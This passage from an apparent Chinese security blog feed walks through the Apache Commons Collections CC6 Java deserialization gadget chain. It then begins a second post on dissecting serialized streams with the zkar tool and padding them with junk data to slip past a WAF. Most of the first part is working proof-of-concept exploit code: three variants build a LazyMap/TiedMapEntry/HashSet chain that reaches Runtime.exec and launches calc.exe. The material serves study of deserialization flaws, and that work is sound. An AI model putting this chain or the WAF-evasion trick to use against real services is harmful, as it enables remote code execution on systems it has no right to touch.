Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;123&quot;</span>);<br><br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span>aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(outerMap,transformerChain );<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>执行一下却不成功。？<br>看这里。这里压根就没有进入if语句，也就不会执行后续cc1链中的东西。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345650.png" alt="QQ截图20220323230710"></p><p>问题出在这里。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345218.png" alt="QQ截图20220323232859"></p><p>跟进put。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345093.png" alt="QQ截图20220323233031"></p><p>这里直接将利用链子执行了一遍。因为之前没有传入真正的chainTransform，所以不会弹出计算器。<br>只要移除就可以了。<br><code>outerMap.remove(&quot;xsw6a&quot;);</code></p><h2 id="poc（成功）"><a href="#poc（成功）" class="headerlink" title="poc（成功）"></a>poc（成功）</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc6Test</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">expMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        expMap.put(tme, <span class="hljs-string">&quot;123&quot;</span>);<br>        outerMap.remove(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span>aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(outerMap,transformerChain );<br><br>        serialize(expMap);<br>        unserialize(<span class="hljs-string">&quot;ser.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;ser.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232345938.png" alt="QQ截图20220323234332"></p><h2 id="ysoserial"><a href="#ysoserial" class="headerlink" title="ysoserial"></a>ysoserial</h2><p>它的链子唯一的区别就是用到了<code>hashset</code>，其实差别不大。看一下利用链子。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-comment">/*</span><br><span class="hljs-comment">Gadget chain:</span><br><span class="hljs-comment">    java.io.ObjectInputStream.readObject()</span><br><span class="hljs-comment">            java.util.HashSet.readObject()</span><br><span class="hljs-comment">                java.util.HashMap.put()</span><br><span class="hljs-comment">                java.util.HashMap.hash()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.hashCode()</span><br><span class="hljs-comment">                    org.apache.commons.collections.keyvalue.TiedMapEntry.getValue()</span><br><span class="hljs-comment">                        org.apache.commons.collections.map.LazyMap.get()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.ChainedTransformer.transform()</span><br><span class="hljs-comment">                            org.apache.commons.collections.functors.InvokerTransformer.transform()</span><br><span class="hljs-comment">                            java.lang.reflect.Method.invoke()</span><br><span class="hljs-comment">                                java.lang.Runtime.exec()</span><br><span class="hljs-comment">    by @matthias_kaiser</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="HashSet-readObject"><a href="#HashSet-readObject" class="headerlink" title="HashSet#readObject()"></a>HashSet#readObject()</h2><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203241101565.png" alt="QQ截图20220324110121"></p><p>跟进put<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203241101143.png" alt="QQ截图20220324110149"></p><p>后续链子跟上面的相同。</p><h2 id="Yso-x2F-POC"><a href="#Yso-x2F-POC" class="headerlink" title="Yso&#x2F;POC"></a>Yso&#x2F;POC</h2><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">import</span> org.apache.commons.collections.Transformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ChainedTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.ConstantTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.functors.InvokerTransformer;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.keyvalue.TiedMapEntry;<br><span class="hljs-keyword">import</span> org.apache.commons.collections.map.LazyMap;<br><br><span class="hljs-keyword">import</span> java.io.FileInputStream;<br><span class="hljs-keyword">import</span> java.io.FileOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> java.util.HashSet;<br><span class="hljs-keyword">import</span> java.util.Map;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">Cc6Yso</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        Transformer[] transformers = <span class="hljs-keyword">new</span> <span class="hljs-title class_">Transformer</span>[] &#123;<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(Runtime.class),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;getMethod&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;String.class, Class[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-string">&quot;getRuntime&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;invoke&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123;Object.class, Object[].class &#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[] &#123; <span class="hljs-literal">null</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Object</span>[<span class="hljs-number">0</span>] &#125;),<br>                <span class="hljs-keyword">new</span> <span class="hljs-title class_">InvokerTransformer</span>(<span class="hljs-string">&quot;exec&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">Class</span>[] &#123; String.class&#125;, <span class="hljs-keyword">new</span> <span class="hljs-title class_">String</span>[] &#123; <span class="hljs-string">&quot;calc.exe&quot;</span> &#125;), <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>),<br>        &#125;;<br>        <span class="hljs-type">Transformer</span> <span class="hljs-variable">transformerChain</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ChainedTransformer</span>(transformers);<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">innerMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        <span class="hljs-type">Map</span> <span class="hljs-variable">outerMap</span> <span class="hljs-operator">=</span> LazyMap.decorate(innerMap, <span class="hljs-keyword">new</span> <span class="hljs-title class_">ConstantTransformer</span>(<span class="hljs-number">1</span>));<br>        <span class="hljs-type">TiedMapEntry</span> <span class="hljs-variable">tme</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">TiedMapEntry</span>(outerMap, <span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        HashSet hashSet=<span class="hljs-keyword">new</span> <span class="hljs-title class_">HashSet</span>(<span class="hljs-number">1</span>);<br>        hashSet.add(tme);<br>        outerMap.remove(<span class="hljs-string">&quot;xsw6a&quot;</span>);<br>        <span class="hljs-type">Class</span> <span class="hljs-variable">aClass</span> <span class="hljs-operator">=</span> LazyMap.class;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">f</span> <span class="hljs-operator">=</span>aClass.getDeclaredField(<span class="hljs-string">&quot;factory&quot;</span>);<br>        f.setAccessible(<span class="hljs-literal">true</span>);<br>        f.set(outerMap,transformerChain );<br><br>        serialize(hashSet);<br>        unserialize(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">serialize</span><span class="hljs-params">(Object obj)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">oos</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileOutputStream</span>(<span class="hljs-string">&quot;xsw6a.bin&quot;</span>));<br>        oos.writeObject(obj);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">unserialize</span><span class="hljs-params">(String Filename)</span> <span class="hljs-keyword">throws</span> Exception &#123;<br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">FileInputStream</span>(Filename));<br>        ois.readObject();<br>    &#125;<br>&#125;<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>cc链</category>
      
    </categories>
    
    
    <tags>
      
      <tag>java</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Java反序列化协议构造与分析</title>
    <link href="/2022/03/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/"/>
    <url>/2022/03/23/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E5%8D%8F%E8%AE%AE%E6%9E%84%E9%80%A0%E4%B8%8E%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h1 id="Java反序列化协议构造与分析"><a href="#Java反序列化协议构造与分析" class="headerlink" title="Java反序列化协议构造与分析"></a>Java反序列化协议构造与分析</h1><p>跟着p神学习（相当于是copy了一遍p神的知识）。<br>首先这里p神引入了<a href="https://github.com/phith0n/zkar#-installing">zkar</a>工具，有些小笨，来说一下如何安装使用他。</p><h2 id="Go语言下载"><a href="#Go语言下载" class="headerlink" title="Go语言下载"></a>Go语言下载</h2><p>这里版本不能太高，因为后续没有<code>go get</code>命令，我用的版本。<br><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117579.png" alt="QQ截图20220323200027"></p><p>如果<code>go get</code>的时候没有反应，<a href="https://www.quanxiaoha.com/golang/go-get-no-response.html">这里</a>设置一下就可以解决。</p><p>接下来就可以学习了。</p><h2 id="序列化流分析"><a href="#序列化流分析" class="headerlink" title="序列化流分析"></a>序列化流分析</h2><p>这里就用p神的代码进行分析。贴一下在zkar工具使用之后的序列化流。</p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs java">zkar dump -B rO0ABXNyAARVc2VyGAiH3nlk+bcCAAJMAARuYW1ldAASTGphdmEvbGFuZy9TdHJpbmc7TAAGcGFyZW50dAAGTFVzZXI7eHB0AANCb2JzcQB+AAB0AAVKb3N1YXA= <span class="hljs-comment">//idea生产的base64</span><br></code></pre></td></tr></table></figure><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><code class="hljs go">@Magic - <span class="hljs-number">0xac</span> ed<br>@Version - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>@Contents<br>  TC_OBJECT - <span class="hljs-number">0x73</span><br>    TC_CLASSDESC - <span class="hljs-number">0x72</span><br>      @ClassName<br>        @Length - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>        @Value - User - <span class="hljs-number">0x55</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span><br>      @SerialVersionUID - <span class="hljs-number">1731783446313105847</span> - <span class="hljs-number">0x18</span> <span class="hljs-number">08</span> <span class="hljs-number">87</span> de <span class="hljs-number">79</span> <span class="hljs-number">64</span> f9 b7<br>      @Handler - <span class="hljs-number">8257536</span><br>      @ClassDescFlags - SC_SERIALIZABLE - <span class="hljs-number">0x02</span><br>      @FieldCount - <span class="hljs-number">2</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">02</span><br>      []Fields<br>        Index <span class="hljs-number">0</span>:<br>          Object - L - <span class="hljs-number">0x4c</span><br>          @FieldName<br>            @Length - <span class="hljs-number">4</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">04</span><br>            @Value - name - <span class="hljs-number">0x6e</span> <span class="hljs-number">61</span> <span class="hljs-number">6</span>d <span class="hljs-number">65</span><br>          @ClassName<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257537</span><br>              @Length - <span class="hljs-number">18</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">12</span><br>              @Value - Ljava/lang/String; - <span class="hljs-number">0x4c</span> <span class="hljs-number">6</span>a <span class="hljs-number">61</span> <span class="hljs-number">76</span> <span class="hljs-number">61</span> <span class="hljs-number">2</span>f <span class="hljs-number">6</span>c <span class="hljs-number">61</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">2</span>f <span class="hljs-number">53</span> <span class="hljs-number">74</span> <span class="hljs-number">72</span> <span class="hljs-number">69</span> <span class="hljs-number">6</span>e <span class="hljs-number">67</span> <span class="hljs-number">3</span>b<br>        Index <span class="hljs-number">1</span>:<br>          Object - L - <span class="hljs-number">0x4c</span><br>          @FieldName<br>            @Length - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>            @Value - parent - <span class="hljs-number">0x70</span> <span class="hljs-number">61</span> <span class="hljs-number">72</span> <span class="hljs-number">65</span> <span class="hljs-number">6</span>e <span class="hljs-number">74</span><br>          @ClassName<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257538</span><br>              @Length - <span class="hljs-number">6</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">06</span><br>              @Value - LUser; - <span class="hljs-number">0x4c</span> <span class="hljs-number">55</span> <span class="hljs-number">73</span> <span class="hljs-number">65</span> <span class="hljs-number">72</span> <span class="hljs-number">3</span>b<br>      []ClassAnnotations<br>        TC_ENDBLOCKDATA - <span class="hljs-number">0x78</span><br>      @SuperClassDesc<br>        TC_NULL - <span class="hljs-number">0x70</span><br>    @Handler - <span class="hljs-number">8257539</span><br>    []ClassData<br>      @ClassName - User<br>        &#123;&#125;Attributes<br>          name<br>            TC_STRING - <span class="hljs-number">0x74</span><br>              @Handler - <span class="hljs-number">8257540</span><br>              @Length - <span class="hljs-number">3</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">03</span><br>              @Value - Bob - <span class="hljs-number">0x42</span> <span class="hljs-number">6</span>f <span class="hljs-number">62</span><br>          parent<br>            TC_OBJECT - <span class="hljs-number">0x73</span><br>              TC_REFERENCE - <span class="hljs-number">0x71</span><br>                @Handler - <span class="hljs-number">8257536</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">7</span>e <span class="hljs-number">00</span> <span class="hljs-number">00</span><br>              @Handler - <span class="hljs-number">8257541</span><br>              []ClassData<br>                @ClassName - User<br>                  &#123;&#125;Attributes<br>                    name<br>                      TC_STRING - <span class="hljs-number">0x74</span><br>                        @Handler - <span class="hljs-number">8257542</span><br>                        @Length - <span class="hljs-number">5</span> - <span class="hljs-number">0x00</span> <span class="hljs-number">05</span><br>                        @Value - Josua - <span class="hljs-number">0x4a</span> <span class="hljs-number">6</span>f <span class="hljs-number">73</span> <span class="hljs-number">75</span> <span class="hljs-number">61</span><br>                    parent<br>                      TC_NULL - <span class="hljs-number">0x70</span><br></code></pre></td></tr></table></figure><p><code>Contents</code>:<strong>只包含一个 newObject ，其第一部分是 ClassDesc ，包含了User这个类的信息，比如类名、SerialVersionUID、父类、属性列表等</strong>。</p><p><code>[]classData</code>:<strong>包含两个属性， name 和 parent ，</strong><br><strong>parent 也是一个 newObject</strong>。</p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232117786.png" alt="QQ截图20220323201106"></p><p><img src="https://cdn.jsdelivr.net/gh/zx-creat/myblog@master/img/202203232011046.png" alt="QQ截图20220323201132"></p><h2 id="构造一个包含垃圾数据的序列化流"><a href="#构造一个包含垃圾数据的序列化流" class="headerlink" title="构造一个包含垃圾数据的序列化流"></a>构造一个包含垃圾数据的序列化流</h2><p>一般垃圾数据多半是绕过waf，这里p神也介绍了<strong>c0ny1</strong>师傅的文章。<br> content 是由 object 或 blockdata 组成， blockdata 就是一个适合用来填充脏字符。</p><p>这里就不用p神的cc6了，因为电脑重装系统了。（文件全没了。）</p><h3 